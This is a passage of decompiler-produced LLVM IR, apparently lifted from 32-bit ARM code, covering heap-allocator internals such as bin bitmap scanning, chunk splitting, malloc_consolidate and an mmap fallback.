  %v0_11d04 = load i32, i32* %r1.global-to-local, align 4
  %v1_11d04 = load i32, i32* %r2.global-to-local, align 4
  %v2_11d04 = add i32 %v1_11d04, 4
  %v3_11d04 = inttoptr i32 %v2_11d04 to i32*
  store i32 %v0_11d04, i32* %v3_11d04, align 4
  %v0_11d08 = load i32, i32* @r6, align 4
  %v1_11d08 = load i32, i32* %r2.global-to-local, align 4
  %v2_11d08 = add i32 %v1_11d08, 12
  %v3_11d08 = inttoptr i32 %v2_11d08 to i32*
  store i32 %v0_11d08, i32* %v3_11d08, align 4
  %v0_11d0c = load i32, i32* @r6, align 4
  %v1_11d0c = load i32, i32* %r2.global-to-local, align 4
  %v2_11d0c = add i32 %v1_11d0c, 8
  %v3_11d0c = inttoptr i32 %v2_11d0c to i32*
  store i32 %v0_11d0c, i32* %v3_11d0c, align 4
  br label %dec_label_pc_122a0

dec_label_pc_11d18:                               ; preds = %dec_label_pc_11c80, %dec_label_pc_11c70
  %v1_11ca8 = phi i32 [ %storemerge.pre, %dec_label_pc_11c70 ], [ %v3_11c8c, %dec_label_pc_11c80 ]
  store i32 %v1_11ca8, i32* %ip.global-to-local, align 4
  %v9_11d18 = icmp eq i32 %v1_11ca8, %v1_11c74
  br i1 %v9_11d18, label %dec_label_pc_11d20.loopexit, label %dec_label_pc_11c80

dec_label_pc_11d20.loopexit:                      ; preds = %dec_label_pc_11d18
  br label %dec_label_pc_11d20

dec_label_pc_11d20:                               ; preds = %dec_label_pc_11c68.dec_label_pc_11d20_crit_edge, %dec_label_pc_11d20.loopexit
  %v4_11d50.pre-phi = phi i32 [ %.pre203, %dec_label_pc_11c68.dec_label_pc_11d20_crit_edge ], [ %v4_11c70, %dec_label_pc_11d20.loopexit ]
  %v1_11d20 = add i32 %v0_11d20.pre, 1
  store i32 %v1_11d20, i32* %r2.global-to-local, align 4
  %v1_11d24 = urem i32 %v1_11d20, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r0.global-to-local, align 4
  %v6_11d30 = shl i32 1, %v1_11d24
  store i32 %v6_11d30, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_11d38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_11d38, i32* %r3.global-to-local, align 4
  %v3_11d3c = udiv i32 %v1_11d20, 32
  store i32 %v3_11d3c, i32* @r5, align 4
  %v4_11d40 = mul nuw nsw i32 %v3_11d3c, 4
  %v5_11d40 = add i32 %v4_11d38, %v4_11d40
  store i32 %v5_11d40, i32* %r2.global-to-local, align 4
  %v1_11d44 = add i32 %v5_11d40, 820
  %v2_11d44 = inttoptr i32 %v1_11d44 to i32*
  %v3_11d44 = load i32, i32* %v2_11d44, align 4
  store i32 %v3_11d44, i32* @r4, align 4
  %v1_11d48 = add i32 %v4_11d38, 52
  store i32 %v1_11d48, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_11d50 = add i32 %v1_11d48, %v4_11d50.pre-phi
  store i32 %v5_11d50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11d54

dec_label_pc_11d54:                               ; preds = %dec_label_pc_11dbc, %dec_label_pc_11d20
  %v1_11d5c = phi i32 [ %v1_11d5c.pre, %dec_label_pc_11dbc ], [ %v3_11d44, %dec_label_pc_11d20 ]
  %v0_11d5c = phi i32 [ %v0_11d54.pre, %dec_label_pc_11dbc ], [ %v6_11d30, %dec_label_pc_11d20 ]
  %v1_11d54 = sub i32 1, %v0_11d5c
  %v2_11d54 = icmp ult i32 %v0_11d5c, 2
  %v1_11d54. = select i1 %v2_11d54, i32 %v1_11d54, i32 0
  store i32 %v1_11d54., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_11d5c, %v1_11d5c
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_11d54
  %v5_11d60 = or i32 %v1_11d54., 1
  store i32 %v5_11d60, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11d6c.preheader

bb145:                                            ; preds = %dec_label_pc_11d54
  %v2_11d64 = icmp eq i32 %v1_11d54., 0
  br i1 %v2_11d64, label %.dec_label_pc_11da8.preheader_crit_edge, label %dec_label_pc_11d6c.preheader

.dec_label_pc_11da8.preheader_crit_edge:          ; preds = %bb145
  %v0_11da057.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11da8.preheader

dec_label_pc_11d6c.preheader:                     ; preds = %bb145, %.thread15
  %v0_11d6c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11d6c

dec_label_pc_11d6c:                               ; preds = %dec_label_pc_11d6c.preheader, %dec_label_pc_11d78
  %v0_11d6c = phi i32 [ %v0_11d6c.pre, %dec_label_pc_11d6c.preheader ], [ %v1_11d6c, %dec_label_pc_11d78 ]
  %v1_11d6c = add i32 %v0_11d6c, 1
  store i32 %v1_11d6c, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_11d6c, 2
  br i1 %tmp211, label %dec_label_pc_11e4c.loopexit, label %dec_label_pc_11d78

dec_label_pc_11d78:                               ; preds = %dec_label_pc_11d6c
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r3.global-to-local, align 4
  %v1_11d7c = load i32, i32* @r8, align 4
  %v2_11d7c = add i32 %v1_11d7c, ptrtoint (i32* @global_var_21698.346 to i32)
  %v3_11d7c = inttoptr i32 %v2_11d7c to i32*
  %v4_11d7c = load i32, i32* %v3_11d7c, align 4
  store i32 %v4_11d7c, i32* %r2.global-to-local, align 4
  %v4_11d80 = mul i32 %v1_11d6c, 4
  %v5_11d80 = add i32 %v4_11d7c, %v4_11d80
  store i32 %v5_11d80, i32* %r3.global-to-local, align 4
  %v1_11d84 = add i32 %v5_11d80, 820
  %v2_11d84 = inttoptr i32 %v1_11d84 to i32*
  %v3_11d84 = load i32, i32* %v2_11d84, align 4
  store i32 %v3_11d84, i32* @r4, align 4
  %v2_11d88 = icmp eq i32 %v3_11d84, 0
  br i1 %v2_11d88, label %dec_label_pc_11d6c, label %dec_label_pc_11d90

dec_label_pc_11d90:                               ; preds = %dec_label_pc_11d78
  %v4_11d90 = mul i32 %v1_11d6c, 256
  %v5_11d90 = add i32 %v4_11d7c, %v4_11d90
  store i32 %v5_11d90, i32* %r3.global-to-local, align 4
  %v1_11d94 = add i32 %v5_11d90, 44
  store i32 %v1_11d94, i32* %r0.global-to-local, align 4
  %v0_11d98 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11d98, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11da8.preheader

dec_label_pc_11da8.preheader:                     ; preds = %.dec_label_pc_11da8.preheader_crit_edge, %dec_label_pc_11d90
  %v0_11da057 = phi i32 [ %v1_11d94, %dec_label_pc_11d90 ], [ %v0_11da057.pre, %.dec_label_pc_11da8.preheader_crit_edge ]
  %v0_11dc4 = phi i32 [ %v3_11d84, %dec_label_pc_11d90 ], [ %v1_11d5c, %.dec_label_pc_11da8.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_11d98, %dec_label_pc_11d90 ], [ %v0_11d5c, %.dec_label_pc_11da8.preheader_crit_edge ]
  %v2_11da854 = and i32 %ip.promoted, %v0_11dc4
  %v4_11da856 = icmp eq i32 %v2_11da854, 0
  br i1 %v4_11da856, label %dec_label_pc_11da0, label %dec_label_pc_11db0

dec_label_pc_11da0:                               ; preds = %dec_label_pc_11da8.preheader, %dec_label_pc_11da0
  %v2_11da459 = phi i32 [ %v2_11da4, %dec_label_pc_11da0 ], [ %ip.promoted, %dec_label_pc_11da8.preheader ]
  %v0_11da058 = phi i32 [ %v1_11da0, %dec_label_pc_11da0 ], [ %v0_11da057, %dec_label_pc_11da8.preheader ]
  %v1_11da0 = add i32 %v0_11da058, 8
  %v2_11da4 = mul i32 %v2_11da459, 2
  %v2_11da8 = and i32 %v2_11da4, %v0_11dc4
  %v4_11da8 = icmp eq i32 %v2_11da8, 0
  br i1 %v4_11da8, label %dec_label_pc_11da0, label %dec_label_pc_11da8.dec_label_pc_11db0_crit_edge

dec_label_pc_11da8.dec_label_pc_11db0_crit_edge:  ; preds = %dec_label_pc_11da0
  store i32 %v1_11da0, i32* %r0.global-to-local, align 4
  store i32 %v2_11da4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11db0

dec_label_pc_11db0:                               ; preds = %dec_label_pc_11da8.dec_label_pc_11db0_crit_edge, %dec_label_pc_11da8.preheader
  %v0_11dd0 = phi i32 [ %v2_11da4, %dec_label_pc_11da8.dec_label_pc_11db0_crit_edge ], [ %ip.promoted, %dec_label_pc_11da8.preheader ]
  %v0_11df4 = phi i32 [ %v1_11da0, %dec_label_pc_11da8.dec_label_pc_11db0_crit_edge ], [ %v0_11da057, %dec_label_pc_11da8.preheader ]
  %v1_11db0 = add i32 %v0_11df4, 12
  %v2_11db0 = inttoptr i32 %v1_11db0 to i32*
  %v3_11db0 = load i32, i32* %v2_11db0, align 4
  store i32 %v3_11db0, i32* @lr, align 4
  %v9_11db4 = icmp eq i32 %v3_11db0, %v0_11df4
  br i1 %v9_11db4, label %dec_label_pc_11dbc, label %dec_label_pc_11ddc

dec_label_pc_11dbc:                               ; preds = %dec_label_pc_11db0
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r0.global-to-local, align 4
  %v1_11dc0 = load i32, i32* @r8, align 4
  %v2_11dc0 = add i32 %v1_11dc0, ptrtoint (i32* @global_var_21698.346 to i32)
  %v3_11dc0 = inttoptr i32 %v2_11dc0 to i32*
  %v4_11dc0 = load i32, i32* %v3_11dc0, align 4
  %v2_11dc4 = sub i32 -1, %v0_11dd0
  %v3_11dc4 = and i32 %v0_11dc4, %v2_11dc4
  store i32 %v3_11dc4, i32* @r4, align 4
  %v1_11dc8 = load i32, i32* @r5, align 4
  %v4_11dc8 = mul i32 %v1_11dc8, 4
  %v5_11dc8 = add i32 %v4_11dc8, %v4_11dc0
  store i32 %v5_11dc8, i32* %r3.global-to-local, align 4
  %v1_11dcc = add i32 %v0_11df4, 8
  store i32 %v1_11dcc, i32* %r0.global-to-local, align 4
  %v2_11dd0 = mul i32 %v0_11dd0, 2
  store i32 %v2_11dd0, i32* %ip.global-to-local, align 4
  %v2_11dd4 = add i32 %v5_11dc8, 820
  %v3_11dd4 = inttoptr i32 %v2_11dd4 to i32*
  store i32 %v3_11dc4, i32* %v3_11dd4, align 4
  %v0_11d54.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_11d5c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11d54

dec_label_pc_11ddc:                               ; preds = %dec_label_pc_11db0
  %v1_11ddc = add i32 %v3_11db0, 4
  %v2_11ddc = inttoptr i32 %v1_11ddc to i32*
  %v3_11ddc = load i32, i32* %v2_11ddc, align 4
  store i32 %v3_11ddc, i32* %r3.global-to-local, align 4
  %v1_11de0 = and i32 %v3_11ddc, -4
  store i32 %v1_11de0, i32* %r2.global-to-local, align 4
  %v0_11de4 = load i32, i32* @sl, align 4
  %v2_11de4 = sub i32 %v1_11de0, %v0_11de4
  store i32 %v2_11de4, i32* %ip.global-to-local, align 4
  %v1_11de8 = add i32 %v3_11db0, 12
  %v2_11de8 = inttoptr i32 %v1_11de8 to i32*
  %v3_11de8 = load i32, i32* %v2_11de8, align 4
  store i32 %v3_11de8, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_11de4, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_11ddc
  %v6_11df0 = add i32 %v1_11de0, %v3_11db0
  store i32 %v6_11df0, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_11ddc, %bb146
  %v2_11df4 = add i32 %v3_11de8, 8
  %v3_11df4 = inttoptr i32 %v2_11df4 to i32*
  store i32 %v0_11df4, i32* %v3_11df4, align 4
  %v0_11df8 = load i32, i32* %r3.global-to-local, align 4
  %v1_11df8 = load i32, i32* %r0.global-to-local, align 4
  %v2_11df8 = add i32 %v1_11df8, 12
  %v3_11df8 = inttoptr i32 %v2_11df8 to i32*
  store i32 %v0_11df8, i32* %v3_11df8, align 4
  %v4_11dfc = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_11cd8_crit_edge, label %dec_label_pc_11e08

.dec_label_pc_11cd8_crit_edge:                    ; preds = %bb147
  %v5_11dfc = add i32 %v4_11dfc, 8
  store i32 %v5_11dfc, i32* %r4.global-to-local, align 4
  %v4_11e00 = load i32, i32* %r2.global-to-local, align 4
  %v5_11e00 = add i32 %v4_11e00, 4
  %v6_11e00 = inttoptr i32 %v5_11e00 to i32*
  %v7_11e00 = load i32, i32* %v6_11e00, align 4
  store i32 %v7_11e00, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11e08:                               ; preds = %bb147
  %v1_11e08 = load i32, i32* @sl, align 4
  %v2_11e08 = add i32 %v1_11e08, %v4_11dfc
  store i32 %v2_11e08, i32* %r1.global-to-local, align 4
  %v1_11e10 = load i32, i32* @r6, align 4
  %v2_11e10 = add i32 %v1_11e10, 8
  %v3_11e10 = inttoptr i32 %v2_11e10 to i32*
  store i32 %v2_11e08, i32* %v3_11e10, align 4
  %v0_11e14 = load i32, i32* %r1.global-to-local, align 4
  %v1_11e14 = load i32, i32* @r6, align 4
  %v2_11e14 = add i32 %v1_11e14, 12
  %v3_11e14 = inttoptr i32 %v2_11e14 to i32*
  store i32 %v0_11e14, i32* %v3_11e14, align 4
  %v0_11e18 = load i32, i32* @r6, align 4
  %v1_11e18 = load i32, i32* %r1.global-to-local, align 4
  %v2_11e18 = add i32 %v1_11e18, 8
  %v3_11e18 = inttoptr i32 %v2_11e18 to i32*
  store i32 %v0_11e18, i32* %v3_11e18, align 4
  %v0_11e1c = load i32, i32* @r6, align 4
  %v1_11e1c = load i32, i32* %r1.global-to-local, align 4
  %v2_11e1c = add i32 %v1_11e1c, 12
  %v3_11e1c = inttoptr i32 %v2_11e1c to i32*
  store i32 %v0_11e1c, i32* %v3_11e1c, align 4
  %tmp213 = icmp ult i32 %v1_11e08, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_11e08
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r2.global-to-local, align 4
  %v8_11e28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v8_11e28, i32* %r3.global-to-local, align 4
  %v4_11e2c = load i32, i32* %r1.global-to-local, align 4
  %v6_11e2c = add i32 %v8_11e28, 48
  %v7_11e2c = inttoptr i32 %v6_11e2c to i32*
  store i32 %v4_11e2c, i32* %v7_11e2c, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_11e08, %bb148
  %v0_11e30 = load i32, i32* @sl, align 4
  %v1_11e30 = or i32 %v0_11e30, 1
  store i32 %v1_11e30, i32* %r2.global-to-local, align 4
  %v0_11e34 = load i32, i32* %ip.global-to-local, align 4
  %v1_11e34 = or i32 %v0_11e34, 1
  store i32 %v1_11e34, i32* %r3.global-to-local, align 4
  %v0_11e38 = load i32, i32* @lr, align 4
  %v1_11e38 = add i32 %v0_11e38, 8
  store i32 %v1_11e38, i32* %r4.global-to-local, align 4
  %v2_11e3c = add i32 %v0_11e38, 4
  %v3_11e3c = inttoptr i32 %v2_11e3c to i32*
  store i32 %v1_11e30, i32* %v3_11e3c, align 4
  %v0_11e40 = load i32, i32* %ip.global-to-local, align 4
  %v1_11e40 = load i32, i32* %r1.global-to-local, align 4
  %v3_11e40 = add i32 %v1_11e40, %v0_11e40
  %v4_11e40 = inttoptr i32 %v3_11e40 to i32*
  store i32 %v0_11e40, i32* %v4_11e40, align 4
  %v0_11e44 = load i32, i32* %r3.global-to-local, align 4
  %v1_11e44 = load i32, i32* %r1.global-to-local, align 4
  %v2_11e44 = add i32 %v1_11e44, 4
  %v3_11e44 = inttoptr i32 %v2_11e44 to i32*
  store i32 %v0_11e44, i32* %v3_11e44, align 4
  br label %dec_label_pc_122a0

dec_label_pc_11e4c.loopexit:                      ; preds = %dec_label_pc_11d6c
  br label %dec_label_pc_11e4c

dec_label_pc_11e4c:                               ; preds = %dec_label_pc_11e4c.loopexit, %dec_label_pc_11a60, %dec_label_pc_11a68
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %ip.global-to-local, align 4
  %v4_11e54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_11e54, i32* @r0, align 4
  %v1_11e58 = add i32 %v4_11e54, 44
  %v2_11e58 = inttoptr i32 %v1_11e58 to i32*
  %v3_11e58 = load i32, i32* %v2_11e58, align 4
  store i32 %v3_11e58, i32* %ip.global-to-local, align 4
  %v1_11e5c = add i32 %v3_11e58, 4
  %v2_11e5c = inttoptr i32 %v1_11e5c to i32*
  %v3_11e5c = load i32, i32* %v2_11e5c, align 4
  %v0_11e60 = load i32, i32* @sl, align 4
  %v1_11e60 = add i32 %v0_11e60, 16
  store i32 %v1_11e60, i32* %r1.global-to-local, align 4
  %v1_11e64 = and i32 %v3_11e5c, -4
  store i32 %v1_11e64, i32* %r3.global-to-local, align 4
  %v3_11e68 = icmp ult i32 %v1_11e64, %v1_11e60
  br i1 %v3_11e68, label %dec_label_pc_11e98, label %dec_label_pc_11e74

dec_label_pc_11e74:                               ; preds = %dec_label_pc_11e4c
  %v2_11e74 = sub i32 %v1_11e64, %v0_11e60
  %v2_11e78 = add i32 %v0_11e60, %v3_11e58
  store i32 %v2_11e78, i32* %r1.global-to-local, align 4
  %v1_11e7c = or i32 %v2_11e74, 1
  store i32 %v1_11e7c, i32* %r3.global-to-local, align 4
  %v1_11e80 = or i32 %v0_11e60, 1
  store i32 %v1_11e80, i32* %r2.global-to-local, align 4
  %v1_11e84 = add i32 %v3_11e58, 8
  store i32 %v1_11e84, i32* %r4.global-to-local, align 4
  store i32 %v1_11e80, i32* %v2_11e5c, align 4
  %v0_11e8c = load i32, i32* %r1.global-to-local, align 4
  %v1_11e8c = load i32, i32* @r0, align 4
  %v2_11e8c = add i32 %v1_11e8c, 44
  %v3_11e8c = inttoptr i32 %v2_11e8c to i32*
  store i32 %v0_11e8c, i32* %v3_11e8c, align 4
  %v0_11e90 = load i32, i32* %r3.global-to-local, align 4
  %v1_11e90 = load i32, i32* %r1.global-to-local, align 4
  %v2_11e90 = add i32 %v1_11e90, 4
  %v3_11e90 = inttoptr i32 %v2_11e90 to i32*
  store i32 %v0_11e90, i32* %v3_11e90, align 4
  br label %dec_label_pc_122a0

dec_label_pc_11e98:                               ; preds = %dec_label_pc_11e4c
  %v1_11e98 = inttoptr i32 %v4_11e54 to i32*
  %v2_11e98 = load i32, i32* %v1_11e98, align 4
  store i32 %v2_11e98, i32* %r3.global-to-local, align 4
  %v1_11e9c = and i32 %v2_11e98, 2
  store i32 %v1_11e9c, i32* %ip.global-to-local, align 4
  %v2_11e9c = icmp eq i32 %v1_11e9c, 0
  %v1_11ea0 = add i32 %v4_11e54, 860
  %v2_11ea0 = inttoptr i32 %v1_11ea0 to i32*
  %v3_11ea0 = load i32, i32* %v2_11ea0, align 4
  store i32 %v3_11ea0, i32* %r1.global-to-local, align 4
  br i1 %v2_11e9c, label %dec_label_pc_11eb8, label %dec_label_pc_11ea8

dec_label_pc_11ea8:                               ; preds = %dec_label_pc_11e98
  %v0_11ea8 = call i32 @__malloc_consolidate()
  %v0_11eac = load i32, i32* @sl, align 4
  %v1_11eac = add i32 %v0_11eac, -7
  store i32 %v1_11eac, i32* @r0, align 4
  %v0_11eb0 = call i32 @malloc()
  store i32 %v0_11eb0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1229c

dec_label_pc_11eb8:                               ; preds = %dec_label_pc_11e98
  %v1_11eb8 = add i32 %v4_11e54, 844
  %v2_11eb8 = inttoptr i32 %v1_11eb8 to i32*
  %v3_11eb8 = load i32, i32* %v2_11eb8, align 4
  store i32 %v3_11eb8, i32* %r3.global-to-local, align 4
  %v3_11ebc = icmp ult i32 %v0_11e60, %v3_11eb8
  %v1_11ec0 = add i32 %v3_11ea0, -1
  store i32 %v1_11ec0, i32* %sb.global-to-local, align 4
  br i1 %v3_11ebc, label %dec_label_pc_11f94, label %dec_label_pc_11ec8

dec_label_pc_11ec8:                               ; preds = %dec_label_pc_11eb8
  %v1_11ec8 = add i32 %v4_11e54, 852
  %v2_11ec8 = inttoptr i32 %v1_11ec8 to i32*
  %v3_11ec8 = load i32, i32* %v2_11ec8, align 4
  store i32 %v3_11ec8, i32* %r2.global-to-local, align 4
  %v1_11ecc = add i32 %v4_11e54, 848
  %v2_11ecc = inttoptr i32 %v1_11ecc to i32*
  %v3_11ecc = load i32, i32* %v2_11ecc, align 4
  store i32 %v3_11ecc, i32* %r3.global-to-local, align 4
  %v6_11ed4 = icmp slt i32 %v3_11ecc, %v3_11ec8
  br i1 %v6_11ed4, label %dec_label_pc_11ed8, label %dec_label_pc_11f94

dec_label_pc_11ed8:                               ; preds = %dec_label_pc_11ec8
  %v1_11ed8 = add i32 %v0_11e60, 10
  %v2_11edc = add i32 %v1_11ed8, %v3_11ea0
  store i32 %v2_11edc, i32* %r3.global-to-local, align 4
  %v2_11ee0 = sub i32 0, %v3_11ea0
  %v3_11ee0 = and i32 %v2_11edc, %v2_11ee0
  store i32 %v3_11ee0, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_11ee0, %v0_11e60
  br i1 %tmp214, label %dec_label_pc_11eec, label %dec_label_pc_11f94

dec_label_pc_11eec:                               ; preds = %dec_label_pc_11ed8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_11ee0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_11f04 = call i32 @mmap(i32 0, i32 %v3_11ee0, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_11f04, i32* %r0.global-to-local, align 4
  %v7_11f08 = icmp eq i32 %v6_11f04, -1
  br i1 %v7_11f08, label %dec_label_pc_11eec.dec_label_pc_11f94_crit_edge, label %dec_label_pc_11f10

dec_label_pc_11eec.dec_label_pc_11f94_crit_edge:  ; preds = %dec_label_pc_11eec
  %v1_11fb8.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_11f94

dec_label_pc_11f10:                               ; preds = %dec_label_pc_11eec
  %v1_11f10 = urem i32 %v6_11f04, 8
  store i32 %v1_11f10, i32* %r2.global-to-local, align 4
  %v2_11f10 = icmp eq i32 %v1_11f10, 0
  br i1 %v2_11f10, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_11f10
  %v2_11f14 = sub nsw i32 8, %v1_11f10
  store i32 %v2_11f14, i32* %r3.global-to-local, align 4
  %v2_11f18 = load i32, i32* @r4, align 4
  %v3_11f18 = sub i32 %v2_11f18, %v2_11f14
  %v3_11f1c = add i32 %v2_11f14, %v6_11f04
  store i32 %v3_11f1c, i32* %lr.global-to-local, align 4
  %v2_11f24 = or i32 %v3_11f18, 2
  store i32 %v2_11f24, i32* %r2.global-to-local, align 4
  %v5_11f2c = inttoptr i32 %v3_11f1c to i32*
  store i32 %v2_11f14, i32* %v5_11f2c, align 4
  %v1_11f30 = load i32, i32* %r2.global-to-local, align 4
  %v2_11f30 = load i32, i32* %lr.global-to-local, align 4
  %v3_11f30 = add i32 %v2_11f30, 4
  %v4_11f30 = inttoptr i32 %v3_11f30 to i32*
  store i32 %v1_11f30, i32* %v4_11f30, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_11f10
  store i32 %v6_11f04, i32* %lr.global-to-local, align 4
  %v1_11f2850 = load i32, i32* @r4, align 4
  %v2_11f2851 = or i32 %v1_11f2850, 2
  store i32 %v2_11f2851, i32* %r3.global-to-local, align 4
  %v3_11f34 = inttoptr i32 %v6_11f04 to i32*
  store i32 0, i32* %v3_11f34, align 4
  %v1_11f38 = load i32, i32* %r3.global-to-local, align 4
  %v2_11f38 = load i32, i32* %lr.global-to-local, align 4
  %v3_11f38 = add i32 %v2_11f38, 4
  %v4_11f38 = inttoptr i32 %v3_11f38 to i32*
  store i32 %v1_11f38, i32* %v4_11f38, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_11f44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_11f44, i32* %ip.global-to-local, align 4
  %v1_11f48 = add i32 %v4_11f44, 848
  %v2_11f48 = inttoptr i32 %v1_11f48 to i32*
  %v3_11f48 = load i32, i32* %v2_11f48, align 4
  store i32 %v3_11f48, i32* %r3.global-to-local, align 4
  %v1_11f4c = add i32 %v4_11f44, 856
  %v2_11f4c = inttoptr i32 %v1_11f4c to i32*
  %v3_11f4c = load i32, i32* %v2_11f4c, align 4
  store i32 %v3_11f4c, i32* %r2.global-to-local, align 4
  %v1_11f50 = add i32 %v3_11f48, 1
  store i32 %v1_11f50, i32* %r3.global-to-local, align 4
  %v7_11f58 = icmp sgt i32 %v1_11f50, %v3_11f4c
  br i1 %v7_11f58, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_11f50, i32* %v2_11f4c, align 4
  %v0_11f5c.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_11f5c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_11f5c = phi i32 [ %v4_11f44, %.thread30 ], [ %v1_11f5c.pre, %bb150 ]
  %v0_11f5c = phi i32 [ %v1_11f50, %.thread30 ], [ %v0_11f5c.pre, %bb150 ]
  %v2_11f5c = add i32 %v1_11f5c, 848
  %v3_11f5c = inttoptr i32 %v2_11f5c to i32*
  store i32 %v0_11f5c, i32* %v3_11f5c, align 4
  %v0_11f60 = load i32, i32* %ip.global-to-local, align 4
  %v1_11f60 = add i32 %v0_11f60, 868
  %v2_11f60 = inttoptr i32 %v1_11f60 to i32*
  %v3_11f60 = load i32, i32* %v2_11f60, align 4
  store i32 %v3_11f60, i32* %r3.global-to-local, align 4
  %v1_11f64 = add i32 %v0_11f60, 880
  %v2_11f64 = inttoptr i32 %v1_11f64 to i32*
  %v3_11f64 = load i32, i32* %v2_11f64, align 4
  store i32 %v3_11f64, i32* %r2.global-to-local, align 4
  %v0_11f68 = load i32, i32* @r4, align 4
  %v2_11f68 = add i32 %v0_11f68, %v3_11f60
  store i32 %v2_11f68, i32* %r1.global-to-local, align 4
  %v1_11f6c = add i32 %v0_11f60, 872
  %v2_11f6c = inttoptr i32 %v1_11f6c to i32*
  %v3_11f6c = load i32, i32* %v2_11f6c, align 4
  store i32 %v3_11f6c, i32* %r3.global-to-local, align 4
  %v1_11f74 = add i32 %v0_11f60, 884
  %v2_11f74 = inttoptr i32 %v1_11f74 to i32*
  %v3_11f74 = load i32, i32* %v2_11f74, align 4
  store i32 %v3_11f74, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_11f68, %v3_11f64
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_11f68, i32* %v2_11f64, align 4
  %v0_11f7c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11f7c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_11f7c = phi i32 [ %v0_11f60, %bb151 ], [ %v1_11f7c.pre, %bb152 ]
  %v0_11f7c = phi i32 [ %v2_11f68, %bb151 ], [ %v0_11f7c.pre, %bb152 ]
  %v2_11f7c = add i32 %v1_11f7c, 868
  %v3_11f7c = inttoptr i32 %v2_11f7c to i32*
  store i32 %v0_11f7c, i32* %v3_11f7c, align 4
  %v0_11f80 = load i32, i32* %r1.global-to-local, align 4
  %v1_11f80 = load i32, i32* %r3.global-to-local, align 4
  %v2_11f80 = add i32 %v1_11f80, %v0_11f80
  store i32 %v2_11f80, i32* %r1.global-to-local, align 4
  %v1_11f84 = load i32, i32* %r2.global-to-local, align 4
  %v0_11f88 = load i32, i32* %lr.global-to-local, align 4
  %v1_11f88 = add i32 %v0_11f88, 8
  store i32 %v1_11f88, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_11f80, %v1_11f84
  br i1 %tmp216, label %bb154, label %dec_label_pc_1229c

bb154:                                            ; preds = %bb153
  %v5_11f8c = load i32, i32* %ip.global-to-local, align 4
  %v6_11f8c = add i32 %v5_11f8c, 884
  %v7_11f8c = inttoptr i32 %v6_11f8c to i32*
  store i32 %v2_11f80, i32* %v7_11f8c, align 4
  br label %dec_label_pc_1229c

dec_label_pc_11f94:                               ; preds = %dec_label_pc_11ed8, %dec_label_pc_11eb8, %dec_label_pc_11eec.dec_label_pc_11f94_crit_edge, %dec_label_pc_11ec8
  %v1_11fb8 = phi i32 [ %v1_11fb8.pre, %dec_label_pc_11eec.dec_label_pc_11f94_crit_edge ], [ %v0_11e60, %dec_label_pc_11ec8 ], [ %v0_11e60, %dec_label_pc_11eb8 ], [ %v0_11e60, %dec_label_pc_11ed8 ]
  store i32 64, i32* %r3.global-to-local, align 4
